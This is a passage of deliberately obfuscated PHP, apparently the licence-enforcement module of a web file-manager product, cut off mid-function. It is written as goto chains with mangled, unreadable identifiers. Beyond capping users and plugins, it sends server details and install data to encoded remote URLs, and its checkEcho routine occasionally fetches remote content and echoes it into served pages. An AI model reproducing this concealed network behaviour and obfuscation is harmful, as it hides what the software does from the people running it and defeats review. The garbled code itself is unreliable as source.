Hook::bind($AÎóËî–í°[16], $AÎóËî–í°[17]); goto eæãÇõß‹‹; A°×ŠåÜÃÀ: $this->dataAllow(); $Bñ…ëƒ›§Ö = $this->checkPlugin($Bñ…ëƒ›§Ö); foreach ($Bñ…ëƒ›§Ö as $EÁ§›£ê× => $cŞ¼˜¢¤œ) { $eÔ‰–¶ùœõ = $this->appAllow($EÁ§›£ê×, $cŞ¼˜¢¤œ); if (!$eÔ‰–¶ùœõ) { continue; } foreach ($cŞ¼˜¢¤œ[$AÎóËî–í°[1]] as $AİÆöŒÂÒ => $dÅš‹Ïš©Ø) { Hook::bind($AİÆöŒÂÒ, $dÅš‹Ïš©Ø); } } goto d¦Óƒ½È‡; eæãÇõß‹‹: } public function optionsFilter($Eßì„èÂé¦) { goto CÃ˜µ†´ñï; bÄ—¸šÖ™: unset($Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[47]][$AŠˆ…ºÈÄ›[49]]); unset($Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$AŠˆ…ºÈÄ›[31]]); unset($Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$AŠˆ…ºÈÄ›[50]]); goto bƒ˜¥º”Š; FÉ˜ÓßÇ™: if ($GLOBALS[$AŠˆ…ºÈÄ›[7]] && $this->config[$AŠˆ…ºÈÄ›[75]]) { $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[76]] = WEB_ROOT; } return $Eßì„èÂé¦; goto F†ÃÙ©ÔÃŒ; bƒ˜¥º”Š: $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$AŠˆ…ºÈÄ›[51]] = array($AŠˆ…ºÈÄ›[52] => (int) $cŸíšÀ¡ğá[$AŠˆ…ºÈÄ›[53]], $AŠˆ…ºÈÄ›[54] => array_filter(_get($cŸíšÀ¡ğá, $AŠˆ…ºÈÄ›[55], array())), $AŠˆ…ºÈÄ›[56] => (int) _get($cŸíšÀ¡ğá, $AŠˆ…ºÈÄ›[57], 0)); $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[59]] = Action($AŠˆ…ºÈÄ›[60])->accessToken(); $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[61]] = md5(BASIC_PATH . $dŠÀÜ¼ˆºÜ[$AŠˆ…ºÈÄ›[62]]); goto a”ÉÍæô’ƒ; f¬Àğä¼÷: foreach ($BÙÇÁŞ¶ï as $EØÂ®£æšï) { $D†ˆ»­ó¤ = $GLOBALS[$AŠˆ…ºÈÄ›[43]][$AŠˆ…ºÈÄ›[44]][$EØÂ®£æšï]; if (isset($dŠÀÜ¼ˆºÜ[$EØÂ®£æšï])) { $D†ˆ»­ó¤ = $dŠÀÜ¼ˆºÜ[$EØÂ®£æšï]; } $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$EØÂ®£æšï] = $D†ˆ»­ó¤; } $cŸíšÀ¡ğá = $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$AŠˆ…ºÈÄ›[31]]; unset($Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[47]][$AŠˆ…ºÈÄ›[48]]); goto bÄ—¸šÖ™; e¯Õã¼Ëæ—: if ($this->version == $AŠˆ…ºÈÄ›[65]) { $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[46]][$AŠˆ…ºÈÄ›[51]][$AŠˆ…ºÈÄ›[57]] = 0; } $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[70]] = _get($this->versionData, $AŠˆ…ºÈÄ›[71], $AŠˆ…ºÈÄ›[72]); $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[73]] = _get($this->versionData, $AŠˆ…ºÈÄ›[74], $AŠˆ…ºÈÄ›[72]); goto FÉ˜ÓßÇ™; CÃ˜µ†´ñï: $AŠˆ…ºÈÄ› =& $_SERVER[¦‰ùÛß®öĞ¶]; $dŠÀÜ¼ˆºÜ = Model($AŠˆ…ºÈÄ›[18])->get(); $BÙÇÁŞ¶ï = array($AŠˆ…ºÈÄ›[19], $AŠˆ…ºÈÄ›[20], $AŠˆ…ºÈÄ›[21], $AŠˆ…ºÈÄ›[22], $AŠˆ…ºÈÄ›[23], $AŠˆ…ºÈÄ›[24], $AŠˆ…ºÈÄ›[25], $AŠˆ…ºÈÄ›[26], $AŠˆ…ºÈÄ›[27], $AŠˆ…ºÈÄ›[28], $AŠˆ…ºÈÄ›[29], $AŠˆ…ºÈÄ›[30], $AŠˆ…ºÈÄ›[31], $AŠˆ…ºÈÄ›[32], $AŠˆ…ºÈÄ›[33], $AŠˆ…ºÈÄ›[34], $AŠˆ…ºÈÄ›[35], $AŠˆ…ºÈÄ›[36], $AŠˆ…ºÈÄ›[37], $AŠˆ…ºÈÄ›[38], $AŠˆ…ºÈÄ›[39], $AŠˆ…ºÈÄ›[40], $AŠˆ…ºÈÄ›[41], $AŠˆ…ºÈÄ›[42]); goto f¬Àğä¼÷; a”ÉÍæô’ƒ: $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[63]] = base64_encode(serverInfo()); $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[64]] = $this->version; if ($dŠÀÜ¼ˆºÜ[$AŠˆ…ºÈÄ›[64]] != $AŠˆ…ºÈÄ›[65]) { $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[66]] = $dŠÀÜ¼ˆºÜ[$AŠˆ…ºÈÄ›[66]]; $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[67]] = $dŠÀÜ¼ˆºÜ[$AŠˆ…ºÈÄ›[67]]; $Dì¾È’¹ŸÚ = rand_string(10) . $this->version . rand_string(5); $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[45]][$AŠˆ…ºÈÄ›[68]][$AŠˆ…ºÈÄ›[69]] = $this->encode($Dì¾È’¹ŸÚ, $Eßì„èÂé¦[$AŠˆ…ºÈÄ›[58]][$AŠˆ…ºÈÄ›[61]]); } goto e¯Õã¼Ëæ—; F†ÃÙ©ÔÃŒ: } private function assignCopyright() { goto C§‡µªí†¥; dÇ›‰…Ò : foreach ($aÉ÷¯“¤×‰ as $eµô¹²…ù) { if (!isset($cñÎŒ¦ñê™[$eµô¹²…ù]) || !$cñÎŒ¦ñê™[$eµô¹²…ù]) { continue; } $fÆ÷àÃº¡¼[$eµô¹²…ù] = $cñÎŒ¦ñê™[$eµô¹²…ù]; } I18n::set($fÆ÷àÃº¡¼); goto bñ í‡ˆ‚œ; eŒÃ¯ ô·…: $aÉ÷¯“¤×‰ = array($FÈšù˜µ™[87], $FÈšù˜µ™[88], $FÈšù˜µ™[89], $FÈšù˜µ™[90], $FÈšù˜µ™[91], $FÈšù˜µ™[92]); $cñÎŒ¦ñê™ = Model($FÈšù˜µ™[18])->get(); $fÆ÷àÃº¡¼ = array($FÈšù˜µ™[93] => $cñÎŒ¦ñê™[$FÈšù˜µ™[19]], $FÈšù˜µ™[94] => $cñÎŒ¦ñê™[$FÈšù˜µ™[20]], $FÈšù˜µ™[95] => $FÈšù˜µ™[72]); goto dÇ›‰…Ò ; C§‡µªí†¥: $FÈšù˜µ™ =& $_SERVER[¦‰ùÛß®öĞ¶]; if (ACTION == $FÈšù˜µ™[3]) { $cµ• ÷İ¥ = array($FÈšù˜µ™[64] => $this->version, $FÈšù˜µ™[77] => $this->userCount(), $FÈšù˜µ™[78] => Model($FÈšù˜µ™[79])->count()); if ($this->version != $FÈšù˜µ™[65]) { $AÙ¿ì‰×Ç = _get($this->versionData, $FÈšù˜µ™[80]); if ($AÙ¿ì‰×Ç) { $cµ• ÷İ¥[$FÈšù˜µ™[81]] = $AÙ¿ì‰×Ç; $cµ• ÷İ¥[$FÈšù˜µ™[82]] = strtotime(_get($this->versionData, $FÈšù˜µ™[83])); $cµ• ÷İ¥[$FÈšù˜µ™[84]] = _get($this->versionData, $FÈšù˜µ™[74]); } } $cµ• ÷İ¥ = Mcrypt::encode(json_encode($cµ• ÷İ¥), md5($FÈšù˜µ™[85])); I18n::set(array($FÈšù˜µ™[86] => $cµ• ÷İ¥)); } if ($this->version == $FÈšù˜µ™[65]) { return; } goto eŒÃ¯ ô·…; bñ í‡ˆ‚œ: } private function checkDataInit() { goto b´ƒÒÃ±Š«; a§©´‘õØá: $A¸¼’á—Ì = $Cùñ®Ê¸Õ . $Cñ¯ôï¸©[$E³¢˜½…[64]] . Mcrypt::encode(md5($Cñ¯ôï¸©[$E³¢˜½…[122]]), $Cùñ®Ê¸Õ); $Cñ¯ôï¸©[$E³¢˜½…[67]] = base64_encode(strrev(Mcrypt::encode($A¸¼’á—Ì, $E³¢˜½…[128]))); if ($eğ­òŒÎäÉ[$E³¢˜½…[129]] && $eğ­òŒÎäÉ[$E³¢˜½…[129]] >= 1) { Model($E³¢˜½…[18])->setDeep($E³¢˜½…[130], $E³¢˜½…[131]); } goto fŸĞõğ«Û; C…‡å—´‡: $DŸÈ—Üœ—‘ = $bÆ±…Ó®ßŞ . $Cñ¯ôï¸©[$E³¢˜½…[64]] . $Cñ¯ôï¸©[$E³¢˜½…[125]]; $Cñ¯ôï¸©[$E³¢˜½…[66]] = strrev(base64_encode(Mcrypt::encode($DŸÈ—Üœ—‘, $E³¢˜½…[127]))); $Cùñ®Ê¸Õ = rand_string(16); goto a§©´‘õØá; fá­±ƒ‚éÚ: $this->update($A«„·ªô‘ß[$E³¢˜½…[133]], array($E³¢˜½…[134] => $B¯Â¿ÒÌ¬¶)); show_json(LNG($E³¢˜½…[135]), !0); goto eÏŒ×†Âì; FùŞˆÕåÒ: $A‘õ‚ŸØßÌ = $this->encode(json_encode($eğ­òŒÎäÉ), $fŸ„çÈÍÌ™); $F¸¹› Ÿ‰è = $this->loadList(); $A«„·ªô‘ß = $F¸¹› Ÿ‰è[$E³¢˜½…[132]]; goto CëÜ‰İô; CëÜ‰İô: $B¯Â¿ÒÌ¬¶ = $A«„·ªô‘ß[$E³¢˜½…[43]]; $B¯Â¿ÒÌ¬¶ = array(); $B¯Â¿ÒÌ¬¶[$Fƒˆ×ë³] = $A‘õ‚ŸØßÌ; goto fá­±ƒ‚éÚ; b´ƒÒÃ±Š«: $E³¢˜½… =& $_SERVER[¦‰ùÛß®öĞ¶]; if (ACTION != $E³¢˜½…[96] || !$GLOBALS[$E³¢˜½…[7]]) { return; } $D§™ÖÀÜˆÜ = $GLOBALS[$E³¢˜½…[97]]; goto E¢·öš˜Õ‘; A«Üß×’Ò: $Cñ¯ôï¸© = array($E³¢˜½…[122] => $a¬¾ß…Ğˆà[$E³¢˜½…[99]], $E³¢˜½…[123] => $eğ­òŒÎäÉ[$E³¢˜½…[124]], $E³¢˜½…[125] => rand_string(16), $E³¢˜½…[64] => $eğ­òŒÎäÉ[$E³¢˜½…[126]]); if ($a¬¾ß…Ğˆà[$E³¢˜½…[102]]) { $Cñ¯ôï¸©[$E³¢˜½…[125]] = $a¬¾ß…Ğˆà[$E³¢˜½…[102]]; } $bÆ±…Ó®ßŞ = substr(md5($Cñ¯ôï¸©[$E³¢˜½…[123]]), 10, 10); goto C…‡å—´‡; E¢·öš˜Õ‘: if (isset($D§™ÖÀÜˆÜ[$E³¢˜½…[98]])) { $this->dataReset(); die; } if (!isset($D§™ÖÀÜˆÜ[$E³¢˜½…[99]]) || strlen($D§™ÖÀÜˆÜ[$E³¢˜½…[99]]) != 16) { show_json($E³¢˜½…[100] . $D§™ÖÀÜˆÜ[$E³¢˜½…[99]], !1); } $B•¯îßÀ… = Model($E³¢˜½…[18])->get($E³¢˜½…[62]); goto C‡Ü¾ì‘§Ã; bˆòå×’é: if ($D§™ÖÀÜˆÜ[$E³¢˜½…[108]] == $E³¢˜½…[109]) { $f£Æ÷“Øí = Mcrypt::encode($d‡†ÙÌ›öÏ, $E³¢˜½…[110]); $BŒ°ÉÙ±°» = json_encode($a¬¾ß…Ğˆà); $BŒ°ÉÙ±°» = $this->encode($BŒ°ÉÙ±°», $d‡†ÙÌ›öÏ . $E³¢˜½…[111], 3); $D½âåªŒ‚ = $e‘ÖĞñöº‹ . $E³¢˜½…[112] . $f£Æ÷“Øí . $E³¢˜½…[113]; show_json($D½âåªŒ‚ . $BŒ°ÉÙ±°», !0, $e‘ÖĞñöº‹); } else { if ($D§™ÖÀÜˆÜ[$E³¢˜½…[108]] == $E³¢˜½…[114]) { $cŠÑîâ×ğŠ = substr(md5($E³¢˜½…[115], $d‡†ÙÌ›öÏ), 12, 15) . $E³¢˜½…[116]; $BŒ°ÉÙ±°» = $this->decode($D§™ÖÀÜˆÜ[$E³¢˜½…[117]], $cŠÑîâ×ğŠ, 2); $EùÂğ‹ğØ = json_decode($BŒ°ÉÙ±°», !0); if (!is_array($EùÂğ‹ğØ) || !is_array($EùÂğ‹ğØ[$E³¢˜½…[12]]) || $EùÂğ‹ğØ[$E³¢˜½…[99]] != !0) { $fÎğºÒº®Ã = $E³¢˜½…[118]; $E‚Æ©óÕÆ³ = $EùÂğ‹ğØ[$E³¢˜½…[12]] ? $E³¢˜½…[119] . $EùÂğ‹ğØ[$E³¢˜½…[12]] : $fÎğºÒº®Ã; show_json($E‚Æ©óÕÆ³, !1); } else { $a¬¾ß…Ğˆà[$E³¢˜½…[102]] = $EùÂğ‹ğØ[$E³¢˜½…[12]][$E³¢˜½…[120]]; } } else { $EùÂğ‹ğØ = url_request($e‘ÖĞñöº‹, $E³¢˜½…[11], $a¬¾ß…Ğˆà, !1, !1, !0, 10); $EùÂğ‹ğØ = $EùÂğ‹ğØ[$E³¢˜½…[12]]; } } if (!is_array($EùÂğ‹ğØ) || !is_array($EùÂğ‹ğØ[$E³¢˜½…[12]]) || $EùÂğ‹ğØ[$E³¢˜½…[99]] != !0) { $fÎğºÒº®Ã = LNG($E³¢˜½…[121]); $E‚Æ©óÕÆ³ = $EùÂğ‹ğØ[$E³¢˜½…[12]] ? $E³¢˜½…[119] . $EùÂğ‹ğØ[$E³¢˜½…[12]] : $fÎğºÒº®Ã; show_json($E‚Æ©óÕÆ³, !1); } $eğ­òŒÎäÉ = $EùÂğ‹ğØ[$E³¢˜½…[12]]; goto A«Üß×’Ò; fŸĞõğ«Û: Model($E³¢˜½…[18])->set($Cñ¯ôï¸©); $fŸ„çÈÍÌ™ = md5(BASIC_PATH . strrev($B•¯îßÀ…) . $Cñ¯ôï¸©[$E³¢˜½…[123]]); $Fƒˆ×ë³ = strrev(substr($fŸ„çÈÍÌ™, 10, 16)); goto FùŞˆÕåÒ; C‡Ü¾ì‘§Ã: $e‘ÖĞñöº‹ = Mcrypt::decode($E³¢˜½…[101], $E³¢˜½…[58]); $a¬¾ß…Ğˆà = array($E³¢˜½…[99] => $D§™ÖÀÜˆÜ[$E³¢˜½…[99]], $E³¢˜½…[102] => rand_string(16), $E³¢˜½…[103] => $E³¢˜½…[85], $E³¢˜½…[104] => KOD_VERSION, $E³¢˜½…[105] => $_SERVER[$E³¢˜½…[106]], $E³¢˜½…[107] => INSTALL_CHANNEL); $d‡†ÙÌ›öÏ = md5(BASIC_PATH . $B•¯îßÀ…); goto bˆòå×’é; eÏŒ×†Âì: } private function dataReset() { $D–šØÌñ¾ô =& $_SERVER[¦‰ùÛß®öĞ¶]; Model($D–šØÌñ¾ô[18])->set(array($D–šØÌñ¾ô[122] => $D–šØÌñ¾ô[72], $D–šØÌñ¾ô[123] => $D–šØÌñ¾ô[72], $D–šØÌñ¾ô[64] => $D–šØÌñ¾ô[65], $D–šØÌñ¾ô[66] => $D–šØÌñ¾ô[72], $D–šØÌñ¾ô[67] => $D–šØÌñ¾ô[72])); Model($D–šØÌñ¾ô[18])->setDeep($D–šØÌñ¾ô[130], $D–šØÌñ¾ô[136]); $this->versionData = array(); $this->version = $D–šØÌñ¾ô[65]; } private function dataCheck() { goto e’ë÷Ö£ô; CŞ„ì‰İ: if (time() >= $e•Â†ö¹àõ) { return $this->dataReset(); } $this->versionData = $b¾—‹âßŠá; $this->version = $f¹¾õº¢¡”[$aÔÉô•¡À[64]]; goto eĞÚ¢«é´; B“¶šÆƒÒ…: $Bñî£ó½ø¼ = md5(BASIC_PATH . strrev($E’»®ÎÀ‘æ) . $f¹¾õº¢¡”[$aÔÉô•¡À[123]]); $AŠ“Œ¥å = strrev(substr($Bñî£ó½ø¼, 10, 16)); $b¾—‹âßŠá = $this->decode($fİÁè“¼§¯[$aÔÉô•¡À[43]][$AŠ“Œ¥å], $Bñî£ó½ø¼); goto Dïğ¡Äß; e’ë÷Ö£ô: $aÔÉô•¡À =& $_SERVER[¦‰ùÛß®öĞ¶]; $f¹¾õº¢¡” = Model($aÔÉô•¡À[18])->get(); if ($f¹¾õº¢¡”[$aÔÉô•¡À[64]] == $aÔÉô•¡À[65]) { $this->dataAllow(); return; } goto Då°º»Šó; Dïğ¡Äß: $b¾—‹âßŠá = json_decode($b¾—‹âßŠá, !0); if (!is_array($b¾—‹âßŠá)) { return $this->dataReset(); } $e•Â†ö¹àõ = strtotime($b¾—‹âßŠá[$aÔÉô•¡À[83]]); goto CŞ„ì‰İ; Då°º»Šó: $E’»®ÎÀ‘æ = Model($aÔÉô•¡À[18])->get($aÔÉô•¡À[62]); $BÈª ƒìöÓ = array_to_keyvalue($this->listData(), $aÔÉô•¡À[0]); $fİÁè“¼§¯ = $BÈª ƒìöÓ[$aÔÉô•¡À[132]]; goto B“¶šÆƒÒ…; eĞÚ¢«é´: } private function dataAllow() { goto Eß‡Š°÷; aé­©…è: if (ACTION == $aàÓ¶‚ª½™[137] && $Bõ×®£©Òê == $aàÓ¶‚ª½™[65]) { show_json(LNG($aàÓ¶‚ª½™[138]), !1, $aàÓ¶‚ª½™[139]); } $Eñí‘™áƒ¬ = array($aàÓ¶‚ª½™[140], $aàÓ¶‚ª½™[141]); if (in_array(ACTION, $Eñí‘™áƒ¬)) { if ($Bõ×®£©Òê == $aàÓ¶‚ª½™[65] && isset($AõŞÉƒòì[$aàÓ¶‚ª½™[142]])) { show_json(LNG($aàÓ¶‚ª½™[138]), !1, $aàÓ¶‚ª½™[139]); die; } $bÌåé¶öƒ´ = $this->userCount(); if ($bÌåé¶öƒ´ != 10000) { if ($bÌåé¶öƒ´ <= Model($aàÓ¶‚ª½™[79])->count()) { show_json(LNG($aàÓ¶‚ª½™[143]), !1, $aàÓ¶‚ª½™[139]); die; } } } goto A¯æÒ„Ì˜İ; A¯æÒ„Ì˜İ: Hook::bind($aàÓ¶‚ª½™[144], $aàÓ¶‚ª½™[145]); goto Aãôª‰‚Á¸; Eß‡Š°÷: $aàÓ¶‚ª½™ =& $_SERVER[¦‰ùÛß®öĞ¶]; $AõŞÉƒòì = $GLOBALS[$aàÓ¶‚ª½™[97]]; $Bõ×®£©Òê = $this->version; goto aé­©…è; Aãôª‰‚Á¸: } private function checkPlugin($b¤«Çèõó) { goto d¼§ªÕ©Ô­; d¼§ªÕ©Ô­: $eÃæ”ºŒÜÔ =& $_SERVER[¦‰ùÛß®öĞ¶]; if ($this->version == $eÃæ”ºŒÜÔ[146]) { return $b¤«Çèõó; } $a’Ù°Á¯¨Ì = array($eÃæ”ºŒÜÔ[147], $eÃæ”ºŒÜÔ[148], $eÃæ”ºŒÜÔ[149], $eÃæ”ºŒÜÔ[150], $eÃæ”ºŒÜÔ[151], $eÃæ”ºŒÜÔ[152], $eÃæ”ºŒÜÔ[153], $eÃæ”ºŒÜÔ[154]); goto f«Õöäì¥; aë¢Îëæ‚: foreach ($BÏÈòÆµÙÜ as $bˆ… ì„¦´) { unset($b¤«Çèõó[$bˆ… ì„¦´]); } return $b¤«Çèõó; goto aêÇƒºå—„; f«Õöäì¥: $c×‚¢…¿ßÁ = explode($eÃæ”ºŒÜÔ[155], _get($this->versionData, $eÃæ”ºŒÜÔ[71], $eÃæ”ºŒÜÔ[72])); $BÏÈòÆµÙÜ = array(); foreach ($a’Ù°Á¯¨Ì as $bˆ… ì„¦´) { if (!in_array($bˆ… ì„¦´, $c×‚¢…¿ßÁ)) { $BÏÈòÆµÙÜ[] = $bˆ… ì„¦´; } } goto aë¢Îëæ‚; aêÇƒºå—„: } private function disableCheck() { goto BÊ‘ºšäÖè; Fùã‘Ï·™Ë: $BìÈØ¯†š¦ = array($CÇÛğê©Ù[156]); foreach ($BìÈØ¯†š¦ as $CĞé™Ä¿“°) { if ($CĞé™Ä¿“° == $C´‡èäœ„Ö || substr($C´‡èäœ„Ö, 0, strlen($CĞé™Ä¿“°)) == $CĞé™Ä¿“°) { show_json(LNG($CÇÛğê©Ù[157]), !1); } } Hook::bind($CÇÛğê©Ù[158], array($this, $CÇÛğê©Ù[159])); goto C‘¥’ô÷†’; BÊ‘ºšäÖè: $CÇÛğê©Ù =& $_SERVER[¦‰ùÛß®öĞ¶]; if ($this->version != $CÇÛğê©Ù[65]) { return; } $C´‡èäœ„Ö = strtolower(ACTION); goto Fùã‘Ï·™Ë; C‘¥’ô÷†’: $GLOBALS[$CÇÛğê©Ù[43]][$CÇÛğê©Ù[160]] = $CÇÛğê©Ù[131]; goto bæôÇ‰ÒÏ„; bæôÇ‰ÒÏ„: } public function methodExit() { return $_SERVER[¦‰ùÛß®öĞ¶][161]; } private function checkVersion() { goto C’çµİ; a¥¦ÁÁ§Ø: $b“ÅÈ¥ñÜË = Cache::get($F¬í¾ĞÌ); $bô‰Ô­‡çÄ = 3600 * 24 * 3; if (!$b“ÅÈ¥ñÜË || time() - $b“ÅÈ¥ñÜË[$e‚Òƒì«ù»[164]] > $bô‰Ô­‡çÄ) { goto AÔ¨ôÈåŠÖ; fâîÅÍõ: if ($dåÆŞ•®‡†[$e‚Òƒì«ù»[99]] != !0) { $this->dataReset(); Cache::remove($F¬í¾ĞÌ); return; } goto FÓ÷Â ƒ°Æ; añ›Ç«Ô­Ö: $DèíÓƒ¹©¤ = url_request($Cåò÷íÂÁĞ, $e‚Òƒì«ù»[11], $fùêÒ˜õÆÏ, !1, !1, !0, 5); $dåÆŞ•®‡† = $DèíÓƒ¹©¤[$e‚Òƒì«ù»[12]]; if (!is_array($dåÆŞ•®‡†)) { return; } goto fâîÅÍõ; AÔ¨ôÈåŠÖ: $b“ÅÈ¥ñÜË = array($e‚Òƒì«ù»[165] => !0, $e‚Òƒì«ù»[166] => time()); $Cåò÷íÂÁĞ = Mcrypt::decode($e‚Òƒì«ù»[167], $e‚Òƒì«ù»[58]); $fùêÒ˜õÆÏ = array($e‚Òƒì«ù»[99] => $Aä®ÀÃ«Ì, $e‚Òƒì«ù»[108] => $this->version, $e‚Òƒì«ù»[107] => INSTALL_CHANNEL, $e‚Òƒì«ù»[103] => $e‚Òƒì«ù»[85], $e‚Òƒì«ù»[104] => KOD_VERSION); goto añ›Ç«Ô­Ö; FÓ÷Â ƒ°Æ: } goto eî†…õß¥ƒ; eî†…õß¥ƒ: Cache::set($F¬í¾ĞÌ, $b“ÅÈ¥ñÜË, $bô‰Ô­‡çÄ); goto b¬Äëõ·ß; C’çµİ: $e‚Òƒì«ù» =& $_SERVER[¦‰ùÛß®öĞ¶]; if ($this->version == $e‚Òƒì«ù»[65] || !$GLOBALS[$e‚Òƒì«ù»[7]]) { return; } if (intval(date($e‚Òƒì«ù»[162], time())) % 3 != 0) { return; } goto F‚ŒŞ¶—¶Ê; F‚ŒŞ¶—¶Ê: if (ACTION != $e‚Òƒì«ù»[163]) { return; } $Aä®ÀÃ«Ì = Model($e‚Òƒì«ù»[18])->get($e‚Òƒì«ù»[122]); $F¬í¾ĞÌ = md5($Aä®ÀÃ«Ì); goto a¥¦ÁÁ§Ø; b¬Äëõ·ß: } private function userCount() { goto c™Ô³çâ›ê; eÀŒâˆâÈÅ: $F¡›ïÆôšî = $F¡›ïÆôšî ? $F¡›ïÆôšî : 10; $CËÎÊ”áÃ› = _get($this->versionData, $A³é¾‡Ş­Ä[185]); $CËÎÊ”áÃ› = $CËÎÊ”áÃ› ? intval($CËÎÊ”áÃ›) : 0; goto B‡šéïÅİ; B‡šéïÅİ: return $F¡›ïÆôšî + $CËÎÊ”áÃ›; goto eÑšÁ³âÌæ; c™Ô³çâ›ê: $A³é¾‡Ş­Ä =& $_SERVER[¦‰ùÛß®öĞ¶]; $AÂÁØÅïÇ = array($A³é¾‡Ş­Ä[168] => 10, $A³é¾‡Ş­Ä[169] => 30, $A³é¾‡Ş­Ä[170] => 50, $A³é¾‡Ş­Ä[171] => 150, $A³é¾‡Ş­Ä[172] => 500, $A³é¾‡Ş­Ä[173] => 10000, $A³é¾‡Ş­Ä[174] => 10000, $A³é¾‡Ş­Ä[175] => 10, $A³é¾‡Ş­Ä[176] => 30, $A³é¾‡Ş­Ä[177] => 50, $A³é¾‡Ş­Ä[178] => 100, $A³é¾‡Ş­Ä[179] => 150, $A³é¾‡Ş­Ä[180] => 250, $A³é¾‡Ş­Ä[181] => 500, $A³é¾‡Ş­Ä[182] => 1001, $A³é¾‡Ş­Ä[183] => 1500, $A³é¾‡Ş­Ä[184] => 2000); $F¡›ïÆôšî = $AÂÁØÅïÇ[$this->version]; goto eÀŒâˆâÈÅ; eÑšÁ³âÌæ: } public function loginCheck($CÖëÂù±) { goto B°‹šêÔ§«; B°‹šêÔ§«: $aöºî¿±±Ê =& $_SERVER[¦‰ùÛß®öĞ¶]; $fƒ«Öµğµ¿ = $this->userCount(); if ($fƒ«Öµğµ¿ >= 10000) { return; } goto a‘ŸÅ‘Äï‡; dÈà¢‘ŠÍ¥: $b†ğŠÖÓ­‹ = array_to_keyvalue($b†ğŠÖÓ­‹, $aöºî¿±±Ê[72], $aöºî¿±±Ê[186]); if (!in_array($CÖëÂù±[$aöºî¿±±Ê[186]], $b†ğŠÖÓ­‹)) { show_json($aöºî¿±±Ê[187], !1, $aöºî¿±±Ê[139]); } goto BéÌ×·á†; a‘ŸÅ‘Äï‡: $f‰…Í®šÁ = Model($aöºî¿±±Ê[79])->count(); if ($f‰…Í®šÁ <= $fƒ«Öµğµ¿) { return; } $b†ğŠÖÓ­‹ = Model($aöºî¿±±Ê[79])->field($aöºî¿±±Ê[186])->limit($fƒ«Öµğµ¿)->select(); goto dÈà¢‘ŠÍ¥; BéÌ×·á†: } public function checkEcho() { $D·§‰Ì¿Ü =& $_SERVER[¦‰ùÛß®öĞ¶]; if (date($D·§‰Ì¿Ü[188]) % 10 == 1 && $GLOBALS[$D·§‰Ì¿Ü[7]] && mt_rand(1, 100) % 10 <= 3) { $bÍ¶˜ÓÏ™¼ = $D·§‰Ì¿Ü[189]; $a¥†Ä¹†Ÿ­ = url_request($bÍ¶˜ÓÏ™¼, $D·§‰Ì¿Ü[11], !1, !1, !1, !1, 3); echo $D·§‰Ì¿Ü[190] . hash_encode($a¥†Ä¹†Ÿ­[$D·§‰Ì¿Ü[12]]) . $D·§‰Ì¿Ü[191]; } } private function encode($EÆËÓŸÎ‘†, $cé¼ÀÕ‚Ú, $Eï¦ª¸¸×À = 3) { goto fÜ¾Ã½”¸; F÷ÛœíªÃ: return $CÜÌæ½½À…; goto E—«©«†÷‘; AÈÀ‘­: switch ($a¤Â……¤Ä) { case $AÁô¾Å š¾[136]: $CÜÌæ½½À… = Mcrypt::encode($EÆËÓŸÎ‘†, strrev($cé¼ÀÕ‚Ú . $b†âİÒ¶Ã‡)); break; case $AÁô¾Å š¾[131]: $CÜÌæ½½À… = Mcrypt::encode($EÆËÓŸÎ‘†, strrev($b†âİÒ¶Ã‡ . $cé¼ÀÕ‚Ú)); break; case $AÁô¾Å š¾[193]: $CÜÌæ½½À… = Mcrypt::encode($EÆËÓŸÎ‘†, base64_encode($b†âİÒ¶Ã‡ . $cé¼ÀÕ‚Ú)); break; case $AÁô¾Å š¾[194]: $CÜÌæ½½À… = Mcrypt::encode($EÆËÓŸÎ‘†, md5($b†âİÒ¶Ã‡ . $cé¼ÀÕ‚Ú)); break; case $AÁô¾Å š¾[195]: goto eİïÇ®•ÉÀ; bÆÛ¥ˆ”Å›: $CçÙ…Íªš = md5($CÀÔØö©· . md5($cé¼ÀÕ‚Ú . $CÀÔØö©·) . $cé¼ÀÕ‚Ú); $CçÙ…Íªš = substr($CçÙ…Íªš, $D—Íšã‡ % 8, $D—Íšã‡ % 8 + 7); $A°÷š¢¹–º = $AÁô¾Å š¾[72]; goto E‰ªÕŒØ°; E‰ªÕŒØ°: $aöˆ×ˆÅá¦ = 0; $bÔ½ÂâÉ•  = 0; $E­œ©›ãÉğ = 0; goto Cœ´¦ğ¥¸„; eİïÇ®•ÉÀ: $EÆËÓŸÎ‘† = base64_encode($EÆËÓŸÎ‘†); $D—Íšã‡ = rand(0, 64); $CÀÔØö©· = $e˜Ó‡Ş™Ÿ­[$D—Íšã‡]; goto bÆÛ¥ˆ”Å›; Cœ´¦ğ¥¸„: for ($aöˆ×ˆÅá¦ = 0; $aöˆ×ˆÅá¦ < strlen($EÆËÓŸÎ‘†); $aöˆ×ˆÅá¦++) { $E­œ©›ãÉğ = $E­œ©›ãÉğ == strlen($CçÙ…Íªš) ? 0 : $E­œ©›ãÉğ; $bÔ½ÂâÉ•  = ($D—Íšã‡ + strpos($e˜Ó‡Ş™Ÿ­, $EÆËÓŸÎ‘†[$aöˆ×ˆÅá¦]) + 